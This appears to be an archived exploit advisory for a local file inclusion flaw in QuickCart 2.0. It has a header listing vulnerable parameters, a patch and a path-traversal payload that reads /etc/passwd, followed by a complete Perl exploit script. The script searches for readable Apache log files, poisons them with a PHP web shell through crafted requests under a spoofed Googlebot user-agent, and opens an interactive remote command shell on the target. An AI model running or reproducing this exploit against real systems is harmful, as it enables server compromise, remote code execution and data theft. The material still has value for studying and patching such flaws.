#################################################################################################
#                                    r0ut3r Presents...                                         #
#                                                                                               #
#                                Another r0ut3r discovery!                                      #
#                                  writ3r [at] gmail.com                                        #
#                                                                                               #
#                        QuickCart 2.0 Local File Inclusion Exploit                             #
#################################################################################################
# Software: QuickCart 2.0                                                                       #
#                                                                                               #
# Vendor: http://opensolution.org/                                                              #
#                                                                                               #
# Released: 2006/12/03                                                                          #
#                                                                                               #
# Critical: Moderately crtical                                                                  #
#                                                                                               #
# Discovered & Exploit By: r0ut3r (writ3r [at] gmail.com)                                       #
#                                                                                               #
# Note: The information provided in this document is for Quick Cart administrator               #
# testing purposes only!                                                                        #
#                                                                                               #
# register_globals must be on                                                                   #
# gpc_magic_quotes must be off                                                                  #
#                                                                                               #
# actions_admin/categories.php?config[db_type]=                                                 #
# actions_admin/couriers.php?config[db_type]=                                                   #
# actions_admin/orders.php?config[db_type]=                                                     #
# actions_admin/products.php?config[db_type]=                                                   #
# actions_client/products.php?config[db_type]=                                                  #
# actions_client/orders.php?config[db_type]=                                                    #
#                                                                                               #
# Vulnerable code:                                                                              #
# require_once DIR_CORE.'couriers-'.$config['db_type'].'.php';                                  #
#                                                                                               #
# Patch: (Place this code at the top of every file)                                             #
# if(basename(__FILE__) == basename($_SERVER['PHP_SELF']))                                      #
#    die();                                                                                     #
#                                                                                               #
# Exploit: categories.php?config[db_type]=../../../../../../../../../../../etc/passwd%00        #
# Usage: perl localfilexpl.pl 127.0.0.1  actions_admin/categories.php?config[db_type]=          #
#################################################################################################

############################################################################
#                   Local File Inclusion Exploiter                         #
#                                                                          #
# This script attempts to exploit a local file include vulnerability       #
# by finding a readable http log file, then by sending a specially crafted #
# http request to the server in order to insert a PHP Shell into the       #
# log files. A shell is then spawned.                                      #
#                                                                          #
# Created By r0ut3r (writ3r [at] gmail.com)                                #
############################################################################

use IO::Socket;
use Switch;

$port = "80"; # connection port
$target = @ARGV[0]; # localhost
$vulnf = @ARGV[1]; # /include/WBmap.php?l=
$opt = @ARGV[2]; # -p (not needed)

sub Header()
{
        print q {Local File Inclusion Exploiter - By r0ut3r (writ3r [at]
gmail.com)
-------------------------------------------------------------------
};
}

sub Usage()
{
        print q {Usage: localfilexpl.pl [target] [folder & vulnerable file]
[opt]
Example: localfilexpl.pl localhost /include/WBmap.php?l= -p
opt = -p (To print recieved content)
};
        exit();
}

Header();

if (!$target || !$vulnf) {
        Usage(); }

@targets = (
"var/log/httpd/access_log",
"var/log/httpd/error_log",
"var/log/access_log",
"var/log/error_log",
"var/www/logs/access.log",
"var/www/logs/access_log",
"var/www/logs/error_log",
"var/www/logs/error.log",
"apache/logs/access_log",
"apache/logs/error.log",
"etc/httpd/logs/access.log",
"etc/httpd/logs/access_log",
"etc/httpd/logs/error.log",
"etc/httpd/logs/error_log",
"usr/local/apache/logs/access.log",
"usr/local/apache/logs/access_log",
"usr/local/apache/logs/error.log",
"usr/local/apache/logs/error_log",
"var/log/apache2/error_log",
"var/log/apache2/error.log",
"var/log/apache2/access_log",
"var/log/apache2/access.log",
"access_log",
);

@paths = ();
$dirs = 5;
$count = 0;

foreach $target (@targets)
{
        for(0..$dirs){
                $paths[$count+$_] = "../"x$_ . $target;
        }
        $count += $dirs;
}

print "[+] Attempting to locate log file\n";
$log = "";
foreach $path (@paths)
{
#print "$path\n";
        $sock = IO::Socket::INET->new(Proto => "tcp", PeerAddr => $target,
PeerPort => $port) || die "[-] Failed to connect. Exiting...\r\n";
        print $sock "GET ".$vulnf.$path."%00 HTTP/1.1\n";
        print $sock "Host: $target\n";
        print $sock "User-Agent: Googlebot/2.1
(+http://www.google.com/bot.html)\n";
        print $sock "Accept: text/html\n";
        print $sock "Connection: close\n\n\r\n";

        while (<$sock>)
        {
                if (/<title>404 Not Found/)
                {
                        print "[-] Vulnerable file not found! Exiting... \n";
                        exit();
                }

                if (/Permission denied/) {
                        print "[-] Log file found, but permission was denied
to read file. [".$path."] \n"; }

                if (/(.*?).(.*?).(.*?).(.*?) - - \[(.*?)/)
                {
                        if ($path ne $log) {
                                print "[+] Log file found! [".$path."] \n"; }
                        $log = $path;
                }
        }
}

if ($log eq "") {
print "[-] Log file not found. Exiting...\n"; exit(); }

$cmdfunct = "system";
print "[+] Inserting PHP Shell into logs\n";
$code = "<?php ob_clean(); echo 'r0ut3r - Local File Include Expoiter '; echo
".$cmdfunct."(\$_GET['cmd']); die(); ?>";
$xpl = IO::Socket::INET->new(Proto => "tcp", PeerAddr => $target, PeerPort =>
$port) || die "[-] Failed to connect. Exiting...\r\n";
print $xpl "GET /".$code." HTTP/1.1\n";
print $xpl "Host: $target\n";
print $xpl "User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\n";
print $xpl "Accept: text/html\n";
print $xpl "Connection: close\n\n\r\n";

@cmdfunctions = ("exec", "shell_exec", "passthru");
$enabled_funct = false;

$xpl_test = IO::Socket::INET->new(Proto => "tcp", PeerAddr => $target,
PeerPort => $port) || die "[-] Failed to connect. Exiting...\r\n";
print $xpl_test "GET ".$vulnf.$path.$log."%00&cmd=dir HTTP/1.1\n";
print $xpl_test "Host: $target\n";
print $xpl_test "User-Agent: Googlebot/2.1
(+http://www.google.com/bot.html)\n";
print $xpl_test "Accept: text/html\n";
print $xpl_test "Connection: close\n\n\r\n";

while (<$xpl_test>)
{
        if (/system\(\) has been disabled for security/)
        {
                print "[-] system() function is disabled. \n";
                foreach $cmdfunct (@cmdfunctions)
                {
                        if ($enabled_funct eq false)
                        {
                                print "[+] Trying ".$cmdfunct."()\n";
                                $code = "<?php ob_clean(); echo 'r0ut3r - Local File Include Expoiter '; echo ".$cmdfunct."(\$_GET['cmd']); die(); ?>";
                                $xpl = IO::Socket::INET->new(Proto => "tcp", PeerAddr => $target, PeerPort => $port) || die "[-] Failed to connect.
Exiting...\r\n";
                                print $xpl "GET /".$code." HTTP/1.1\n";
                                print $xpl "Host: $target\n";
                                print $xpl "User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\n";
                                print $xpl "Accept: text/html\n";
                                print $xpl "Connection: close\n\n\r\n";

                                $xpl_retry = IO::Socket::INET->new(Proto => "tcp", PeerAddr => $target, PeerPort => $port) || die "[-] Failed to connect.
Exiting...\r\n";
                                print $xpl_retry "GET ".$vulnf.$path.$log."%00&cmd=dir HTTP/1.1\n";
                                print $xpl_retry "Host: $target\n";
                                print $xpl_retry "User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\n";
                                print $xpl_retry "Accept: text/html\n";
                                print $xpl_retry "Connection: close\n\n\r\n";

                                while (<$xpl_retry>)
                                {
                                        if (/b>:  $cmdfunct\(\) has been disabled for security reasons/)
                                        {
                                                print "[-] ".$cmdfunct."() function is disabled. \n";
                                                $enabled_funct = false;
                                                last;
                                        }
                                        else
                                        {
                                                $enabled_funct = true;
                                        }
                                }

                                if ($enabled_funct eq true)
                                {
                                        print "[+] Enabled function found! [".$cmdfunct."]\n";
                                        break;
                                }
                        }
                }

                if ($enabled_funct eq false) {
                print "[-] No enabled cmd function found. Tried system(),
exec(), shell_exec(), passthru()\n"; exit(); }
        }
}

print "[!] Command execution at: http://".$target.$vulnf.$log."%00\n";
print "[+] Creating shell - Type 'exit' to quit\n";

print "[cmd]\$ ";
$cmd = <STDIN>;
$cmd =~ s/ /%20/g;

while ($cmd !~ "exit")
{
        $scmd = IO::Socket::INET->new(Proto => "tcp", PeerAddr => $target,
PeerPort => $port) || die "[-] Failed to connect. Exiting...\r\n";
        print $scmd "GET ".$vulnf.$path.$log."%00&cmd=".substr($cmd, 0, -1)."
HTTP/1.1\n";
        print $scmd "Host: $target\n";
        print $scmd "User-Agent: Googlebot/2.1
(+http://www.google.com/bot.html)\n";
        print $scmd "Accept: text/html\n";
        print $scmd "Connection: close\n\n\r\n";

        # prints output from command execution
        if ($opt eq "-p")
        {
                while (<$scmd>)
                {
                        print <$scmd>;
                }
        }

        print "[cmd]\$ ";
        $cmd = <STDIN>;
        $cmd =~ s/ /%20/g;
}

# milw0rm.com [2006-12-03]